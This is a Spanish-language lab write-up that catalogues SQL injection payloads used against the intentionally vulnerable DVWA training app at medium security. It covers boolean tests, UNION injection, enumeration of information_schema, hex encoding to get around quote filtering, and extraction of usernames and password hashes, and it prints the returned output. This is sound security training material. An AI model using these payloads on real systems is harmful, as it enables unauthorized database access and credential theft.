
## Overview

Este documento recopila los principales payloads utilizados durante el laboratorio **DVWA SQL Injection — Medium Level**.

Cada comando incluye:

- Objetivo técnico
- Payload utilizado
- Resultado esperado
- Resultado observado

---

# 1. Initial Input Testing

## Payload

```sql
1
```

### Objetivo

Validar comportamiento normal del parámetro.

### Resultado esperado

Consulta válida.

### Resultado observado

La aplicación devolvió información correspondiente al ID consultado.

---

## Payload

```sql
2
```

### Objetivo

Comprobar variación de resultados entre distintos valores.

### Resultado observado

Respuesta consistente con otro registro válido.

---

## Payload

```sql
9999
```

### Objetivo

Evaluar manejo de IDs inexistentes.

### Resultado observado

Sin coincidencias o comportamiento distinto respecto a registros válidos.

---

# 2. Boolean-Based SQL Injection

## Payload

```sql
1 AND 1=1
```

### Objetivo

Confirmar evaluación lógica dentro de la consulta SQL.

### Resultado esperado

La condición TRUE mantiene el comportamiento original.

### Resultado observado

La aplicación respondió correctamente.

**Boolean SQL Injection confirmada.**

---

## Payload

```sql
1 AND 1=2
```

### Objetivo

Verificar diferencia lógica entre TRUE y FALSE.

### Resultado esperado

La condición FALSE modifica la salida.

### Resultado observado

La aplicación devolvió resultado diferente o vacío.

**Confirmación de control lógico sobre la query.**

---

# 3. UNION Validation

## Payload

```sql
1 UNION SELECT version(),database()
```

### Objetivo

Comprobar:

- número de columnas
- capacidad UNION injection
- acceso a funciones internas SQL

### Resultado esperado

Obtención de:

- versión MySQL
- base activa

### Resultado observado

Se recuperaron correctamente:

```txt
MySQL version
Database name
```

**UNION SQL Injection validada.**

---

# 4. Database Enumeration

## Payload

```sql
1 UNION SELECT table_name,table_schema
FROM information_schema.tables
```

### Objetivo

Enumerar tablas disponibles dentro del servidor MySQL.

### Resultado esperado

Listado de tablas y schemas.

### Resultado observado

Se identificaron múltiples bases:

```txt
dvwa
mysql
owasp10
tikiwiki
information_schema
```

---

# 5. Column Enumeration

## Payload

```sql
1 UNION SELECT column_name,table_name
FROM information_schema.columns
WHERE table_name=0x7573657273
```

### Objetivo

Descubrir columnas pertenecientes a la tabla `users`.

### Técnica utilizada

Hexadecimal Encoding Bypass.

```txt
0x7573657273 → users
```

### Resultado observado

Columnas identificadas:

```txt
user_id
first_name
last_name
user
password
avatar
```

---

# 6. Filter Bypass Validation

## Payload clásico

```sql
'users'
```

### Objetivo

Testing de payload tradicional basado en quotes.

### Resultado observado

Comportamiento inconsistente / bloqueado bajo Medium.

---

## Payload adaptado

```sql
0x7573657273
```

### Objetivo

Evitar restricciones asociadas a quote filtering.

### Resultado observado

Bypass exitoso.

Enumeration funcional.

---

# 7. Credential Extraction

## Payload

```sql
1 UNION SELECT user,password FROM users
```

### Objetivo

Extraer información sensible desde tabla vulnerable.

### Resultado observado

Usuarios recuperados:

```txt
admin
gordon
1337
pablo
smithy
```

Hashes obtenidos:

```txt
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
```

---

# 8. Comparative Payload Behaviour

| Payload | LOW | MEDIUM |
|----------|-----|---------|
| `' OR '1'='1` | Works | Partial / Fails |
| `1 AND 1=1` | Works | Works |
| `UNION SELECT` | Works | Works |
| Numeric Injection | Works | Works |
| Hex Encoding | Optional | Useful |

---

# Key Takeaways

- Boolean SQLi remained functional in Medium.
- UNION exploitation remained viable.
- Numeric payloads bypassed defensive changes.
- Hex encoding allowed adaptation against quote restrictions.
- information_schema enabled structured database reconnaissance.
- SQL Injection ultimately resulted in credential disclosure.
